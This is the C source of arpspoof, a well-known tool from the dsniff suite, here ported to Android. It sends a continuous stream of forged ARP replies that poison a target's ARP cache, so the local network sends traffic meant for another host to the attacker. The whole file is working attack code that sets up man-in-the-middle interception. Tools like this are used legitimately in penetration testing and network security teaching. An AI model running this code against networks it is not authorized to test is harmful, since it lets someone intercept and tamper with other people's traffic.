/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 */
//Modified by Robbie Clemons <robclemons@gmail.com> 7/16/2011 for Android

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include <netinet/if_ether.h>

#include <droid.h>
#include "ensure_death.h"

#include "arp.h"
#include "version.h"

//extern char *ether_ntoa(struct ether_addr *);

/*Added since Android's ndk couldn't find ether_ntoa*/
char *ether_ntoa(struct ether_addr *addr)
{	//taken from inet/ether_ntoa_r.c
	static char buf[18];
	sprintf (buf, "%x:%x:%x:%x:%x:%x",
        	addr->ether_addr_octet[0], addr->ether_addr_octet[1],
        	addr->ether_addr_octet[2], addr->ether_addr_octet[3],
        	addr->ether_addr_octet[4], addr->ether_addr_octet[5]);
	return buf;
}

static libnet_t *l;
static struct ether_addr spoof_mac, target_mac;
static in_addr_t spoof_ip, target_ip;
static char *intf;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-i interface] [-t target] host\n");
	exit(1);
}

static int
arp_send(libnet_t *l, int op, u_int8_t *sha,
	 in_addr_t spa, u_int8_t *tha, in_addr_t tpa)
{
	int retval;

	if (sha == NULL &&
	    (sha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
		return (-1);
	}
	if (spa == 0) {
		if ((spa = libnet_get_ipaddr4(l)) == -1)
			return (-1);
	}
	if (tha == NULL)
		tha = "\xff\xff\xff\xff\xff\xff";
	
	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
			     tha, (u_int8_t *)&tpa, l);
	libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, l, 0);
	
	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)sha));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	retval = libnet_write(l);
    char *libnetError = libnet_geterror(l);
	if (strlen(libnetError) > 0) {
		fprintf(stderr, "%s", libnetError);
        exit(1);
    }


	libnet_clear_packet(l);

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip);
#endif
		sleep(1);
	}
	while (i++ < 3);

	return (0);
}

static void
cleanup(int sig)
{
	int i;
	
	if (arp_find(spoof_ip, &spoof_mac)) {
		for (i = 0; i < 3; i++) {
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			arp_send(l, ARPOP_REPLY,
				 (u_int8_t *)&spoof_mac, spoof_ip,
				 (target_ip ? (u_int8_t *)&target_mac : NULL),
				 target_ip);
			sleep(1);
		}
	}
	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int c;
	
	intf = NULL;
	spoof_ip = target_ip = 0;
	
	while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 't':
			if ((target_ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
				usage();
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();
	
	if ((spoof_ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
		usage();
	
	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL) {
		fprintf(stderr, "%s", pcap_ebuf);
		exit(1);
	}

	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL) {
		fprintf(stderr, "%s", libnet_ebuf);
		exit(1);
	}
	
	if (target_ip != 0 && !arp_find(target_ip, &target_mac)) {
		fprintf(stderr, "couldn't arp for host %s", 
			libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
		exit(1);
	}
	
	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	/*Makes sure that if the calling app dies we quit spoofing*/
	ensure_death();
	
	for (;;) {
		arp_send(l, ARPOP_REPLY, NULL, spoof_ip,
			 (target_ip ? (u_int8_t *)&target_mac : NULL),
			 target_ip);
		sleep(1);
	}
	/* NOTREACHED */
	
	exit(0);
}
